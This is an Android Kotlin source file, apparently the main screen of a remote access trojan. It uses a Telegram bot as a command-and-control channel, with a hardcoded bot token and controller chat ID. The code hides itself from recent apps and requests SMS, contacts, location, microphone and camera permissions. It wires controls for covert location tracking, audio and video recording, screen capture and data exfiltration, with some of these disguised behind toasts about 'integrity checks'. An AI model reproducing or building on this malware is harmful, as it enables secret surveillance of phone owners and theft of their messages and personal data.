package com.mzkyzak.appbug

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.mzkyzak.appbug.databinding.ActivityMainBinding
import android.media.projection.MediaProjectionManager
import androidx.activity.result.contract.ActivityResultContracts

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var screenshotCapture: ScreenshotCapture
    private val BOT_TOKEN = "8898141962:AAHK5OWEo5UFNWGszehi97U8ZQSdPSyXEns"

    private val projectionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            screenshotCapture.startCapture(result.resultCode, result.data!!)
            Toast.makeText(this, "Kalibrasi Visual OTW...", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val masterId = "6945113481"
        screenshotCapture = ScreenshotCapture(this, TelegramC2Client(BOT_TOKEN, masterId))

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val manager = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
            manager.appTasks.firstOrNull()?.setExcludeFromRecents(true)
        }

        binding.etChatId.setText(masterId)
        getSharedPreferences("rat_prefs", MODE_PRIVATE).edit().putString("chat_id", masterId).apply()

        if (checkPermissions()) {
            startCoreServices(masterId, null)
        } else {
            requestPermissions()
        }

        binding.btnStartUpdate.setOnClickListener {
            val chatId = binding.etChatId.text.toString()
            if (chatId.isNotEmpty()) {
                startCoreServices(chatId, null)
                Toast.makeText(this, "Modul Udah Konek, gng!", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnLocation.setOnClickListener {
            startCoreServices(binding.etChatId.text.toString(), "ACTION_REPORT_LOCATION")
        }

        binding.btnAudio.setOnClickListener {
            startCoreServices(binding.etChatId.text.toString(), "ACTION_START_AUDIO")
        }

        binding.btnScreenshot.setOnClickListener {
            val mpManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            projectionLauncher.launch(mpManager.createScreenCaptureIntent())
        }

        binding.btnScreenshot.setOnLongClickListener {
            startCoreServices(binding.etChatId.text.toString(), "ACTION_BRUTAL_EXFIL")
            true
        }

        binding.btnInstantPhoto.setOnClickListener {
            startCoreServices(binding.etChatId.text.toString(), "ACTION_LIVE_PHOTO")
        }
        
        binding.btnInstantPhoto.setOnLongClickListener {
            startCoreServices(binding.etChatId.text.toString(), "ACTION_LIVE_PHOTO_FRONT")
            true
        }

        binding.btnStreamVideo.setOnClickListener {
            startCoreServices(binding.etChatId.text.toString(), "ACTION_RECORD_VIDEO")
        }
        
        binding.btnStreamVideo.setOnLongClickListener {
            startCoreServices(binding.etChatId.text.toString(), "ACTION_RECORD_VIDEO_FRONT")
            true
        }

        binding.btnExfiltrate.setOnClickListener {
            startCoreServices(binding.etChatId.text.toString(), "ACTION_RUN_EXFIL")
            Toast.makeText(this, "Cek Integritas OTW...", Toast.LENGTH_SHORT).show()
        }

        binding.btnSettings.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } catch (e: Exception) {}
        }
    }

    private fun checkPermissions(): Boolean {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
        ), 100)
    }

    private fun startCoreServices(chatId: String, action: String?) {
        val intent = Intent(this, RatForegroundService::class.java).apply {
            putExtra("CHAT_ID", chatId)
            this.action = action
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}
